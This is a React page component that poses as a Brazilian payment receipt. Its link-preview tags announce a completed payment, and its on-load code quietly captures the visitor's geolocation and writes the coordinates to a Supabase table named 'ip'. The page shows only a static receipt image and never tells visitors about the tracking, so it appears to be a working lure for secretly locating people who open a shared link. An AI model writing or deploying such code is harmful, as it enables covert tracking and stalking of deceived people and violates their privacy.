import { useEffect } from 'react'
import { Helmet } from 'react-helmet-async'

import { supabase } from '../@config/supabase'
export const Home = () => {
  useEffect(() => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          await supabase.from('ip').insert([
            {
              lat: position.coords.latitude,
              lon: position.coords.longitude,
            },
          ])
        },
        (err) => {
          console.error(err)
        },
      )
    } else {
      console.log('Geolocalização não suportada pelo navegador.')
    }
  }, [])

  return (
    <main className="flex min-h-screen items-center justify-center bg-zinc-50">
      <Helmet title="Comprovante de pagamento disponível">
        <meta property="og:title" content="Pagamento concluído com sucesso" />
        <meta
          property="og:description"
          content="Seu pagamento foi concluído com sucesso. Caso queira ver o comprovante, basta acessar o link."
        />

        <meta
          property="og:image"
          content="https://i.pinimg.com/736x/f9/fe/50/f9fe50dbdfd23e12ad00f3ddad477b8c.jpg"
        />
        <meta
          property="image"
          content="https://i.pinimg.com/736x/f9/fe/50/f9fe50dbdfd23e12ad00f3ddad477b8c.jpg"
        />
        <meta property="og:image:type" content="image/jpg" />
        <meta property="og:image:width" content="635" />
        <meta property="og:image:height" content="476" />

        <meta property="og:type" content="website" />
      </Helmet>

      <div className="overflow-hidden rounded-2xl border">
        <img
          src="/comprovante.png"
          alt="Comprovante de pagamento"
          className="pointer-events-none w-[400px] select-none object-contain"
        />
      </div>
    </main>
  )
}
